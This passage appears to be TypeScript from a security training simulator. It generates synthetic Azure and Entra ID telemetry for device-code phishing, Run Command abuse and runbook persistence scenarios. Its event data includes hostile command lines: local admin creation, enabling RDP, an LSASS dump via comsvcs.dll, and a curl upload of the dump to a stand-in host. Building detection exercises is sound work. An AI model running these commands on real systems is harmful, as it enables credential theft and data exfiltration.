/**
 * Cloud round, Azure: five attack families on the Azure control plane and Entra ID, each a single-player
 * variant (mode "solo") and a Team Training variant (mode "team") with their own people, entry path and plot.
 *
 *  family cloud-azure-device-code (device-code phishing, Storm-2372 pattern)
 *   - cloud-az-devicecode-sharepoint     solo, core   A sales rep enters a code on the real device login page;
 *                                                     the token is redeemed elsewhere and SharePoint is swept.
 *   - cloud-az-devicecode-azcli          team, adv.   A DevOps lead's code is for the Azure CLI; the token
 *                                                     lists storage keys and opens a disk snapshot for download.
 *  family cloud-azure-vm-run-command (Run Command through the control plane)
 *   - cloud-az-runcommand-sp-localadmin  solo, core   A deployment service principal, used from a hosting
 *                                                     address, runs a script that adds a local admin.
 *   - cloud-az-runcommand-managed-lsass  team, adv.   A managed Run Command written by a user session from
 *                                                     outside dumps a process's memory on an ERP VM.
 *  family cloud-azure-automation-persistence (Automation runbooks as a way back in)
 *   - cloud-az-runbook-webhook-secret    solo, core   A runbook behind a webhook adds a client secret to an app
 *                                                     whenever an outside address calls it.
 *   - cloud-az-runbook-schedule-nsg      team, adv.   An hourly runbook re-creates a deleted network rule
 *                                                     that lets RDP in from an outside address.
 *  family cloud-azure-federation-backdoor (trust modification, Storm-0501 / Golden SAML pattern)
 *   - cloud-az-federated-domain          solo, adv.   A domain is switched to an outside issuer, then a user
 *                                                     signs in with MFA satisfied by a claim in that token.
 *   - cloud-az-federated-credential-app  team, adv.   A federated credential added to an app trusts an outside
 *                                                     repository; the app then reads mailboxes.
 *  family cloud-azure-function-publish-profile (a Function App taken over through its deployment credentials)
 *   - cloud-az-function-publishxml       solo, core   A publish profile downloaded from a hosting address, new
 *                                                     app settings, then the app's managed identity lists
 *                                                     storage keys from outside Azure.
 *   - cloud-az-function-basic-auth       team, adv.   Basic publishing credentials re-enabled and listed, then
 *                                                     the app's identity grants a role to an outside principal.
 *
 * Effects only: operation names, callers, addresses, results and sizes, never a script body or a token.
 */
import type { TelemetryEvent, Severity } from "@/lib/sim/types";
import { entraAudit, entraSignIn } from "@/lib/sim/emitters/entra";
import { m365Operation } from "@/lib/sim/emitters/m365";
import { csDetection } from "@/lib/sim/emitters/crowdstrike";
import type { GeoLite } from "@/lib/sim/emitters/azureAi";
import { makeSha256 } from "@/lib/sim/iocs";
import type { AiStoryDef } from "../ai-stories/wave2";
import { CX, OFFICE_EGRESS, azureOp, benign, fileRow, netRow, proc, sentinel, ticket, withIncident } from "../ai-stories/wave4-shared";
import { changeFields, clock } from "../web-stories/entry";

const UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.3537.57";
const UA_PY = "python-requests/2.32.3";
const UA_AZCLI = "python/3.12.7 (Linux-6.8.0-1015-azure-x86_64-with-glibc2.39) AZURECLI/2.67.0 (DEB)";
const UA_AZPS = "AzurePowershell/v12.4.0 PSVersion/v7.4.6";
const AZ_CLI_APP = "04b07795-8ddb-461a-bbee-02f9e1bf7b46";
const OFFICE_APP = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const AMS: GeoLite = { country: "Netherlands", iso: "NL", city: "Amsterdam", lat: 52.3676, lon: 4.9041 };
const FRA: GeoLite = { country: "Germany", iso: "DE", city: "Frankfurt", lat: 50.1109, lon: 8.6821 };
const ASH: GeoLite = { country: "United States", iso: "US", city: "Ashburn", lat: 39.0438, lon: -77.4874 };
const SIN: GeoLite = { country: "Singapore", iso: "SG", city: "Singapore", lat: 1.3521, lon: 103.8198 };
const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

/** An Azure Activity Log record on one resource. */
function az(o: {
  id: string; ts: string; op: string; caller: string; ip: string; provider: string; type: string; name: string; group: string; role: string;
  severity: Severity; description: string; mitre?: string; tactic?: string; geo?: GeoLite; asOrg?: string; subResource?: string;
}): TelemetryEvent {
  return azureOp({
    id: o.id, ts: o.ts, operation: o.op, caller: o.caller, callerIp: o.ip, provider: o.provider, type: o.type, name: o.name, group: o.group, role: o.role,
    severity: o.severity, description: o.description, mitre: o.mitre, tactic: o.tactic, geo: o.geo, asOrg: o.asOrg, subResource: o.subResource,
  });
}

// ══════════════════════════════════════════════════════════════════════════════
// 1a. Device code, solo: a sales rep's code, then SharePoint swept from elsewhere
// ══════════════════════════════════════════════════════════════════════════════
function deviceCodeSharePoint(): TelemetryEvent[] {
  const T = clock("2026-11-09T09:00:00Z");
  const v = "a.kaplan@nexacorp.com";
  const room = "m.levi@nexacorp.com";
  const atk = "203.0.113.134";
  const session = "9e21c4a7-30d8-4b6f-a1e5-6c0b42f87d13";
  const site = "https://nexacorp.sharepoint.com/sites/Sales";
  const dl = (id: string, min: number, file: string, size: number) => m365Operation({
    companyId: CX, id, ts: T(min), user: v, operation: "FileDownloaded", workload: "SharePoint", srcIp: atk, siteUrl: site,
    objectId: `${site}/Shared Documents/Accounts/${file}`, fileName: file, fileSize: size, userAgent: UA_PY, severity: "high", mitre: "T1213.002", tactic: "Collection",
    description: `SharePoint audit: FileDownloaded of ${file} from the Sales site by ${v} from ${atk}, user agent python-requests.`,
  });
  return withIncident([
    benign(entraSignIn({
      companyId: CX, id: "r6azdc01", ts: T(0), user: room, srcIp: OFFICE_EGRESS, app: "Microsoft Teams", authenticationProtocol: "deviceCode", isInteractive: true,
      managed: true, compliant: true, os: "Android", userAgent: "Dalvik/2.1.0 (Linux; U; Android 12; Teams Room Panel)", conditionalAccess: "success", severity: "low",
      description: `Entra ID sign-in for ${room} to Microsoft Teams from the office egress with authenticationProtocol deviceCode, on a compliant Android device.`,
    }), "Re-pairing a Teams Rooms panel uses the device code flow: compliant managed device, office egress, the operations lead who looks after the rooms."),
    entraSignIn({
      companyId: CX, id: "r6azdc02", ts: T(62), user: v, srcIp: OFFICE_EGRESS, app: "Microsoft Office", appId: OFFICE_APP, resource: "Office 365 SharePoint Online",
      authenticationProtocol: "deviceCode", isInteractive: true, mfa: true, userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 141.0.0", sessionId: session,
      severity: "medium", mitre: "T1528", tactic: "Credential Access",
      description: `Entra ID interactive sign-in for ${v} to Microsoft Office from the office egress, authenticationProtocol deviceCode, MFA completed. ${v} has no earlier deviceCode sign-ins.`,
    }),
    entraSignIn({
      companyId: CX, id: "r6azdc03", ts: T(62.5), user: v, srcIp: atk, app: "Microsoft Office", appId: OFFICE_APP, resource: "Office 365 SharePoint Online",
      authenticationProtocol: "deviceCode", isInteractive: false, mfa: true, userAgent: UA_PY, sessionId: session, riskLevel: "medium", riskEventTypes: ["anomalousToken"],
      severity: "high", mitre: "T1550.001", tactic: "Lateral Movement",
      description: `Entra ID non-interactive sign-in for ${v} to Microsoft Office from ${atk}, same session, user agent python-requests, risk medium (anomalousToken).`,
    }),
    m365Operation({
      companyId: CX, id: "r6azdc04", ts: T(66), user: v, operation: "FileAccessed", workload: "SharePoint", srcIp: atk, siteUrl: site,
      objectId: `${site}/Shared Documents/Accounts/Account-plan-index.xlsx`, fileName: "Account-plan-index.xlsx", userAgent: UA_PY, severity: "medium", mitre: "T1213.002", tactic: "Collection",
      description: `SharePoint audit: FileAccessed of Account-plan-index.xlsx, the index of the Accounts library, by ${v} from ${atk}.`,
    }),
    dl("r6azdc05", 68, "Renewals-2027-pricing.xlsx", 418_220),
    dl("r6azdc06", 68.4, "Key-accounts-contacts.xlsx", 1_204_880),
    dl("r6azdc07", 69, "Master-services-agreement-template.docx", 288_140),
    sentinel({
      id: "r6azdc08", ts: T(71), user: v, srcIp: atk, severity: "high", eventType: "cloud_api_call", mitre: "T1528", tactic: "Credential Access",
      alertName: "Device code sign-in followed by token use from a second network",
      detail: "A deviceCode sign-in and a non-interactive sign-in of one session come from two networks within a minute.",
      extendedProperties: { UserPrincipalName: v, SessionId: session, FirstIp: OFFICE_EGRESS, SecondIp: atk, AuthenticationProtocol: "deviceCode" },
      description: `Microsoft Sentinel: one session of ${v} spans the office egress and ${atk} right after a deviceCode sign-in.`,
    }),
    m365Operation({
      companyId: CX, id: "r6azdc09", ts: T(74), user: v, operation: "FileSyncDownloadedFull", workload: "SharePoint", srcIp: atk, siteUrl: site,
      objectId: `${site}/Shared Documents/Accounts`, userAgent: UA_PY, severity: "high", mitre: "T1213.002", tactic: "Collection",
      description: `SharePoint audit: FileSyncDownloadedFull of the Accounts library by ${v} from ${atk}.`,
    }),
    ticket({ id: "r6azdc10", ts: T(96), table: "incident", number: "INC0118842", state: "In Progress", caller: room, severity: "informational",
      shortDescription: "Sales rep reports a sign-in prompt with a code from a meeting invite; sessions revoked, password reset pending",
      description: "ServiceNow incident INC0118842 (In Progress): a sales rep entered a code from a meeting invite on the Microsoft device login page; sessions revoked." }),
  ], "inc:r6az:devicecode-sp");
}

// ══════════════════════════════════════════════════════════════════════════════
// 1b. Device code, team: an Azure CLI code; the token lists storage keys and exports a disk
// ══════════════════════════════════════════════════════════════════════════════
function deviceCodeAzCli(): TelemetryEvent[] {
  const T = clock("2026-11-10T14:00:00Z");
  const v = "t.harris@nexacorp.com";
  const it = "l.ferreira@nexacorp.com";
  const atk = "198.51.100.236";
  const session = "2b7f0d91-5a3c-4e88-9d27-41c6a0e5b3f9";
  const st = { provider: "Microsoft.Storage", type: "storageAccounts", group: "rg-finance-data", role: "Contributor" };
  const snap = { provider: "Microsoft.Compute", type: "snapshots", name: "snap-erp-osdisk-1110", group: "rg-erp-prod" };
  return withIncident([
    benign(entraSignIn({
      companyId: CX, id: "r6azcl01", ts: T(0), user: it, srcIp: OFFICE_EGRESS, app: "Microsoft Azure CLI", appId: AZ_CLI_APP, resource: "Windows Azure Service Management API",
      authenticationProtocol: "deviceCode", isInteractive: true, mfa: true, managed: true, compliant: true, userAgent: UA_AZCLI, os: "Linux", severity: "low",
      description: `Entra ID sign-in for ${it} to Microsoft Azure CLI from the office egress, authenticationProtocol deviceCode, on the managed admin jump host.`,
    }), "The service desk signs the Azure CLI in on the headless admin jump host with az login --use-device-code: managed device, office egress, its usual pattern."),
    entraSignIn({
      companyId: CX, id: "r6azcl02", ts: T(40), user: v, srcIp: OFFICE_EGRESS, app: "Microsoft Azure CLI", appId: AZ_CLI_APP, resource: "Windows Azure Service Management API",
      authenticationProtocol: "deviceCode", isInteractive: true, mfa: true, userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 141.0.0", sessionId: session,
      severity: "medium", mitre: "T1528", tactic: "Credential Access",
      description: `Entra ID interactive sign-in for ${v} to Microsoft Azure CLI from the office egress in a browser, authenticationProtocol deviceCode, MFA completed.`,
    }),
    entraSignIn({
      companyId: CX, id: "r6azcl03", ts: T(40.4), user: v, srcIp: atk, app: "Microsoft Azure CLI", appId: AZ_CLI_APP, resource: "Windows Azure Service Management API",
      authenticationProtocol: "deviceCode", isInteractive: false, mfa: true, userAgent: UA_AZCLI, sessionId: session, severity: "high", mitre: "T1550.001", tactic: "Lateral Movement",
      description: `Entra ID non-interactive sign-in for ${v} to Microsoft Azure CLI from ${atk}, same session, a Linux Azure CLI user agent.`,
    }),
    az({ ...st, id: "r6azcl04", ts: T(43), op: "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", caller: v, ip: atk, name: "stfinexports01", geo: FRA, asOrg: "hosting provider",
      severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: `Azure Activity: listKeys on storage account stfinexports01 by ${v} from ${atk}.` }),
    az({ ...st, id: "r6azcl05", ts: T(43.6), op: "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", caller: v, ip: atk, name: "stpayrollarchive", geo: FRA, asOrg: "hosting provider",
      severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: `Azure Activity: listKeys on storage account stpayrollarchive by ${v} from ${atk}.` }),
    az({ ...snap, id: "r6azcl06", ts: T(47), op: "MICROSOFT.COMPUTE/SNAPSHOTS/WRITE", caller: v, ip: atk, role: "Contributor", geo: FRA, asOrg: "hosting provider",
      severity: "high", mitre: "T1537", tactic: "Exfiltration",
      description: `Azure Activity: snapshot snap-erp-osdisk-1110 created from the ERP VM's OS disk by ${v} from ${atk}.` }),
    az({ ...snap, id: "r6azcl07", ts: T(49), op: "MICROSOFT.COMPUTE/SNAPSHOTS/BEGINGETACCESS/ACTION", caller: v, ip: atk, role: "Contributor", geo: FRA, asOrg: "hosting provider",
      severity: "critical", mitre: "T1537", tactic: "Exfiltration",
      description: `Azure Activity: beginGetAccess on snapshot snap-erp-osdisk-1110 by ${v} from ${atk}: a SAS URL that lets anyone holding it download the disk.` }),
    sentinel({
      id: "r6azcl08", ts: T(52), user: v, srcIp: atk, severity: "high", eventType: "cloud_api_call", mitre: "T1537", tactic: "Exfiltration",
      alertName: "Disk or snapshot export by a user signed in through device code",
      detail: "beginGetAccess on a disk or snapshot within an hour of a deviceCode sign-in by the same caller, from a network not seen for that caller.",
      extendedProperties: { Caller: v, CallerIp: atk, Snapshot: "snap-erp-osdisk-1110", SignInProtocol: "deviceCode" },
      description: `Microsoft Sentinel: ${v} exported snapshot snap-erp-osdisk-1110 from ${atk}, 12 minutes after a deviceCode sign-in.`,
    }),
    az({ ...snap, id: "r6azcl09", ts: T(58), op: "MICROSOFT.COMPUTE/SNAPSHOTS/ENDGETACCESS/ACTION", caller: it, ip: OFFICE_EGRESS, role: "Owner", severity: "informational",
      description: `Azure Activity: endGetAccess on snapshot snap-erp-osdisk-1110 by ${it} from the office egress, revoking the SAS.` }),
  ], "inc:r6az:devicecode-cli");
}

// ══════════════════════════════════════════════════════════════════════════════
// 2a. Run Command, solo: a deployment principal adds a local admin on a payroll VM
// ══════════════════════════════════════════════════════════════════════════════
function runCommandLocalAdmin(): TelemetryEvent[] {
  const T = clock("2026-11-11T02:10:00Z");
  const sp = "7a4d2e19-6b8c-4f31-9e05-c2d81a6f4b37";
  const it = "l.ferreira@nexacorp.com";
  const atk = "203.0.113.135";
  const vm = { host: "app-payroll-vm01", ip: "10.10.40.21", user: "NT AUTHORITY\\SYSTEM" };
  const plugin = "C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\1.1.18";
  const script = `${plugin}\\Downloads\\script0.ps1`;
  const rc = { provider: "Microsoft.Compute", type: "virtualMachines", name: vm.host, group: "rg-payroll-prod" };
  return withIncident([
    ticket({ id: "r6azrc00", ts: T(-600), table: "change_request", number: "CHG0062871", state: "Implement", caller: it, severity: "informational",
      shortDescription: "Monthly patch check on the payroll VMs through Run Command", eventType: "policy_modification",
      description: "ServiceNow change CHG0062871 (Implement): monthly patch-level check on the payroll VMs with Run Command.",
      extra: changeFields({ requestedBy: "l.ferreira@nexacorp.com", group: "Service Desk", ci: "app-payroll-vm01", from: "2026-11-10T16:00:00Z", hours: 4, detail: "Run the patch-level check script on the payroll VMs with Azure Run Command and record the results." }) }),
    benign(az({ ...rc, id: "r6azrc01", ts: T(-560), op: "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION", caller: it, ip: OFFICE_EGRESS, role: "Virtual Machine Contributor", severity: "medium",
      mitre: "T1651", tactic: "Execution", description: `Azure Activity: runCommand on ${vm.host} by ${it} from the office egress.` }),
      "The approved monthly patch check (CHG0062871): the service desk's own account, from the office, inside the change window."),
    az({ ...rc, id: "r6azrc02", ts: T(0), op: "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION", caller: sp, ip: atk, role: "Virtual Machine Contributor", geo: SIN, asOrg: "hosting provider",
      severity: "high", mitre: "T1651", tactic: "Execution",
      description: `Azure Activity: runCommand on ${vm.host} by the service principal ${sp} (the payroll deployment pipeline) from ${atk}. The pipeline runs from the build agents and never runs commands on VMs.` }),
    fileRow(vm, {
      id: "r6azrc03", ts: T(0.4), path: script, size: 1_284, action: "file_create", sha256: makeSha256("r6az:rc:script0"), actorProcess: "RunCommandExtension.exe",
      actorPath: `${plugin}\\bin\\RunCommandExtension.exe`, actorPid: 3816, runAsUser: "NT AUTHORITY\\SYSTEM", severity: "medium", mitre: "T1651", tactic: "Execution",
      description: `The Run Command extension wrote script0.ps1 (1,284 bytes) on ${vm.host}: the script the control plane delivered.`,
    }),
    proc(vm, {
      id: "r6azrc04", ts: T(0.6), pid: 4412, processName: "powershell.exe", processPath: PS, parentName: "RunCommandExtension.exe", parentPid: 3816,
      cmdline: `powershell.exe -ExecutionPolicy Unrestricted -File ${script}`, runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1651", tactic: "Execution",
      description: `On ${vm.host}, the Run Command extension started PowerShell as SYSTEM with script0.ps1 from its Downloads folder.`,
    }),
    proc(vm, {
      id: "r6azrc05", ts: T(0.9), pid: 4536, processName: "net.exe", processPath: "C:\\Windows\\System32\\net.exe", parentName: "powershell.exe", parentPid: 4412,
      cmdline: "net.exe user svc_payrep /add", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1136.001", tactic: "Persistence",
      description: `script0.ps1 created a local account svc_payrep on ${vm.host}.`,
    }),
    proc(vm, {
      id: "r6azrc06", ts: T(1.0), pid: 4580, processName: "net1.exe", processPath: "C:\\Windows\\System32\\net1.exe", parentName: "powershell.exe", parentPid: 4412,
      cmdline: "net1.exe localgroup administrators svc_payrep /add", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1098", tactic: "Persistence",
      description: `script0.ps1 added svc_payrep to the local Administrators group on ${vm.host}.`,
    }),
    proc(vm, {
      id: "r6azrc07", ts: T(1.2), pid: 4628, processName: "netsh.exe", processPath: "C:\\Windows\\System32\\netsh.exe", parentName: "powershell.exe", parentPid: 4412,
      cmdline: "netsh.exe advfirewall firewall set rule group=\"remote desktop\" new enable=Yes", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1021.001", tactic: "Lateral Movement",
      description: `script0.ps1 enabled the Remote Desktop firewall rules on ${vm.host}.`,
    }),
    csDetection({
      companyId: CX, id: "r6azrc08", ts: T(1.3), host: vm.host, srcIp: vm.ip, user: vm.user, pid: 4412, parentPid: 3816, processName: "powershell.exe", processPath: PS,
      parentName: "RunCommandExtension.exe", cmdline: `powershell.exe -ExecutionPolicy Unrestricted -File ${script}`, sha256: makeSha256("r6az:rc:script0"),
      threatName: "Suspicious account creation from a Run Command script", technique: "Create Account: Local Account", tactic: "Persistence", mitre: "T1136.001",
      action: "detected", severity: "high", eventType: "edr_alert",
      description: `Endpoint alert on ${vm.host}: a Run Command script created a local account and added it to Administrators.`,
    }),
    netRow(vm, {
      id: "r6azrc09", ts: T(14), direction: "inbound", remoteIp: atk, remotePort: 3389, application: "tls", processName: "svchost.exe", processPath: "C:\\Windows\\System32\\svchost.exe", pid: 1124,
      bytesOut: 2_840_120, bytesIn: 412_880, severity: "high", mitre: "T1021.001", tactic: "Lateral Movement",
      description: `Inbound RDP to ${vm.host} from ${atk}, the address that ran the command, 14 minutes later.`,
    }),
    sentinel({
      id: "r6azrc10", ts: T(15), srcIp: atk, entity: vm.host, host: vm.host, severity: "high", eventType: "cloud_api_call", mitre: "T1651", tactic: "Execution",
      alertName: "Run Command by a service principal from outside its usual addresses",
      detail: "virtualMachines/runCommand/action by a service principal whose sign-ins come from build agents, from an address outside them.",
      extendedProperties: { Caller: sp, CallerIp: atk, VirtualMachine: vm.host },
      description: `Microsoft Sentinel: the payroll deployment principal ran a command on ${vm.host} from ${atk}.`,
    }),
  ], "inc:r6az:rc-localadmin");
}

// ══════════════════════════════════════════════════════════════════════════════
// 2b. Run Command, team: a managed Run Command from outside dumps a process on an ERP VM
// ══════════════════════════════════════════════════════════════════════════════
function runCommandManagedDump(): TelemetryEvent[] {
  const T = clock("2026-11-12T21:30:00Z");
  const u = "t.harris@nexacorp.com";
  const atk = "198.51.100.237";
  const vm = { host: "app-erp-vm02", ip: "10.10.40.32", user: "NT AUTHORITY\\SYSTEM" };
  const plugin = "C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandHandlerWindows\\2.0.12";
  const rc = { provider: "Microsoft.Compute", type: "virtualMachines", name: vm.host, group: "rg-erp-prod", role: "Virtual Machine Contributor" };
  const dump = "C:\\Windows\\Temp\\erp-diag.bin";
  const dumpCmd = `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 ${dump} full`;
  const script = `${plugin}\\Downloads\\diag-collect.ps1`;
  const scriptSha = makeSha256("r6az:mr:diag-collect");
  return withIncident([
    benign(az({ ...rc, id: "r6azmr01", ts: T(-1200), op: "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMANDS/WRITE", caller: "c3f81e27-0d4a-4b95-8e6c-71a2d9f04b58", ip: "192.0.2.92",
      subResource: "runCommands/UpdateAssessment", severity: "medium", mitre: "T1651", tactic: "Execution",
      description: `Azure Activity: runCommands/write (UpdateAssessment) on ${vm.host} by the Azure Update Manager service principal from an Azure address.` }),
      "Azure Update Manager writes a managed run command for its assessment on every VM it patches: its own service principal, an Azure address, the published name UpdateAssessment."),
    entraSignIn({
      companyId: CX, id: "r6azmr02", ts: T(0), user: u, srcIp: atk, app: "Microsoft Azure PowerShell", resource: "Windows Azure Service Management API",
      isInteractive: false, mfa: true, userAgent: UA_AZPS, riskLevel: "high", riskEventTypes: ["unfamiliarFeatures"], severity: "high", mitre: "T1550.001", tactic: "Lateral Movement",
      description: `Entra ID non-interactive sign-in for ${u} to Microsoft Azure PowerShell from ${atk}, risk high (unfamiliarFeatures). ${u} works from the office and has never used Azure PowerShell from outside.`,
    }),
    az({ ...rc, id: "r6azmr03", ts: T(3), op: "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMANDS/WRITE", caller: u, ip: atk, subResource: "runCommands/diag-collect", geo: ASH, asOrg: "hosting provider",
      severity: "high", mitre: "T1651", tactic: "Execution",
      description: `Azure Activity: runCommands/write creating a managed run command named diag-collect on ${vm.host} by ${u} from ${atk}.` }),
    fileRow(vm, {
      id: "r6azmr03b", ts: T(3.6), path: script, size: 2_208, action: "file_create", sha256: scriptSha, actorProcess: "RunCommandService.exe",
      actorPath: `${plugin}\\bin\\RunCommandService.exe`, actorPid: 5904, runAsUser: "NT AUTHORITY\\SYSTEM", severity: "medium", mitre: "T1651", tactic: "Execution",
      description: `The managed Run Command handler wrote diag-collect.ps1 (2,208 bytes) on ${vm.host}: the script the control plane delivered.`,
    }),
    proc(vm, {
      id: "r6azmr04", ts: T(3.8), pid: 6212, processName: "powershell.exe", processPath: PS, parentName: "RunCommandService.exe", parentPid: 5904,
      cmdline: `powershell.exe -NoProfile -ExecutionPolicy Bypass -File ${script}`, runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system",
      severity: "high", mitre: "T1651", tactic: "Execution",
      description: `On ${vm.host}, the managed Run Command handler started PowerShell as SYSTEM with diag-collect.ps1.`,
    }),
    proc(vm, {
      id: "r6azmr05", ts: T(4.1), pid: 6340, processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe", parentName: "powershell.exe", parentPid: 6212,
      cmdline: dumpCmd, runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "critical", mitre: "T1003.001", tactic: "Credential Access",
      description: `diag-collect.ps1 ran rundll32 with comsvcs.dll MiniDump on process 712 (lsass.exe) into ${dump}.`,
    }),
    csDetection({
      companyId: CX, id: "r6azmr06", ts: T(4.3), host: vm.host, srcIp: vm.ip, user: vm.user, pid: 6212, parentPid: 5904, processName: "powershell.exe", processPath: PS,
      parentName: "RunCommandService.exe", cmdline: `powershell.exe -NoProfile -ExecutionPolicy Bypass -File ${script}`, sha256: scriptSha,
      threatName: "Suspicious access to LSASS service", technique: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access", mitre: "T1003.001",
      action: "detected", severity: "critical", eventType: "edr_alert",
      description: `Endpoint alert "Suspicious access to LSASS service" on ${vm.host}: diag-collect.ps1, run by the Run Command handler, started rundll32 with comsvcs.dll MiniDump on lsass.exe.`,
    }),
    fileRow(vm, {
      id: "r6azmr07", ts: T(4.6), path: dump, size: 61_204_480, action: "file_create", sha256: null, actorProcess: "rundll32.exe", actorPath: "C:\\Windows\\System32\\rundll32.exe",
      actorPid: 6340, actorParentName: "powershell.exe", actorParentPid: 6212, runAsUser: "NT AUTHORITY\\SYSTEM", severity: "critical", mitre: "T1003.001", tactic: "Credential Access",
      description: `rundll32.exe wrote erp-diag.bin (about 61 MB) into C:\\Windows\\Temp on ${vm.host}.`,
    }),
    proc(vm, {
      id: "r6azmr08", ts: T(6), pid: 6512, processName: "curl.exe", processPath: "C:\\Windows\\System32\\curl.exe", parentName: "powershell.exe", parentPid: 6212,
      cmdline: `curl.exe -s -T ${dump} https://upload.diag-relay.example/c/7d1e`, runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "critical", mitre: "T1041", tactic: "Exfiltration",
      description: "diag-collect.ps1 uploaded erp-diag.bin to upload.diag-relay.example with curl.",
    }),
    netRow(vm, {
      id: "r6azmr09", ts: T(6.2), remoteIp: "198.51.100.238", remotePort: 443, domain: "upload.diag-relay.example", application: "tls", processName: "curl.exe",
      processPath: "C:\\Windows\\System32\\curl.exe", pid: 6512, parentName: "powershell.exe", parentPid: 6212, bytesOut: 61_480_220, bytesIn: 3_120, severity: "critical", mitre: "T1041", tactic: "Exfiltration",
      description: `curl.exe on ${vm.host} sent about 61 MB to upload.diag-relay.example (198.51.100.238).`,
    }),
    az({ ...rc, id: "r6azmr10", ts: T(9), op: "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMANDS/DELETE", caller: u, ip: atk, subResource: "runCommands/diag-collect", geo: ASH, asOrg: "hosting provider",
      severity: "high", mitre: "T1070", tactic: "Stealth",
      description: `Azure Activity: the managed run command diag-collect deleted from ${vm.host} by ${u} from ${atk}, six minutes after it was written.` }),
    sentinel({
      id: "r6azmr11", ts: T(10), user: u, srcIp: atk, host: vm.host, severity: "critical", eventType: "cloud_api_call", mitre: "T1003.001", tactic: "Credential Access",
      alertName: "Credential dump on a VM after a Run Command from a risky sign-in",
      detail: "A runCommands/write by a caller with a high-risk sign-in, followed by an LSASS access alert on the same VM.",
      extendedProperties: { Caller: u, CallerIp: atk, VirtualMachine: vm.host, RunCommand: "diag-collect" },
      description: `Microsoft Sentinel: a Run Command by ${u} from ${atk} was followed by an LSASS dump on ${vm.host}.`,
    }),
  ], "inc:r6az:rc-dump");
}

// ══════════════════════════════════════════════════════════════════════════════
// 3a. Automation, solo: a webhook runbook that adds a client secret on demand
// ══════════════════════════════════════════════════════════════════════════════
function runbookWebhookSecret(): TelemetryEvent[] {
  const T = clock("2026-11-13T10:00:00Z");
  const u = "t.harris@nexacorp.com";
  const it = "l.ferreira@nexacorp.com";
  const atk = "203.0.113.136";
  const caller2 = "203.0.113.137";
  const aa = { provider: "Microsoft.Automation", type: "automationAccounts", name: "aa-ops-automation", group: "rg-ops", role: "Automation Contributor" };
  const mi = "aa-ops-automation";
  return withIncident([
    ticket({ id: "r6azrb00", ts: T(-300), table: "change_request", number: "CHG0063014", state: "Implement", caller: it, severity: "informational",
      shortDescription: "New runbook Rotate-AppLogs with a nightly schedule in aa-ops-automation", eventType: "policy_modification",
      description: "ServiceNow change CHG0063014 (Implement): runbook Rotate-AppLogs and its nightly schedule in aa-ops-automation.",
      extra: changeFields({ requestedBy: "l.ferreira@nexacorp.com", group: "Service Desk", ci: "aa-ops-automation", from: "2026-11-13T04:00:00Z", hours: 6, detail: "Create the Rotate-AppLogs runbook and its nightly schedule in aa-ops-automation." }) }),
    benign(az({ ...aa, id: "r6azrb01", ts: T(-280), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/WRITE", caller: it, ip: OFFICE_EGRESS, subResource: "runbooks/Rotate-AppLogs",
      severity: "low", description: `Azure Activity: runbook Rotate-AppLogs written in aa-ops-automation by ${it} from the office egress.` }),
      "The approved log rotation runbook (CHG0063014): the service desk's account, the office, the name the change gives."),
    entraSignIn({
      companyId: CX, id: "r6azrb02", ts: T(0), user: u, srcIp: atk, app: "Azure Portal", resource: "Windows Azure Service Management API", isInteractive: true, mfa: true,
      userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 141.0.0", riskLevel: "medium", riskEventTypes: ["unfamiliarFeatures"], severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Entra ID sign-in for ${u} to the Azure Portal from ${atk}, MFA satisfied, risk medium (unfamiliarFeatures).`,
    }),
    az({ ...aa, id: "r6azrb03", ts: T(6), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/WRITE", caller: u, ip: atk, subResource: "runbooks/Sync-CertInventory", geo: AMS, asOrg: "hosting provider",
      severity: "medium", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: runbook Sync-CertInventory written in aa-ops-automation by ${u} from ${atk}.` }),
    az({ ...aa, id: "r6azrb04", ts: T(7), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/PUBLISH/ACTION", caller: u, ip: atk, subResource: "runbooks/Sync-CertInventory", geo: AMS, asOrg: "hosting provider",
      severity: "medium", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: runbook Sync-CertInventory published by ${u} from ${atk}.` }),
    az({ ...aa, id: "r6azrb05", ts: T(8), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/WEBHOOKS/WRITE", caller: u, ip: atk, subResource: "webhooks/cert-sync-hook", geo: AMS, asOrg: "hosting provider",
      severity: "high", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: webhook cert-sync-hook created for Sync-CertInventory by ${u} from ${atk}, expiry ten years out.` }),
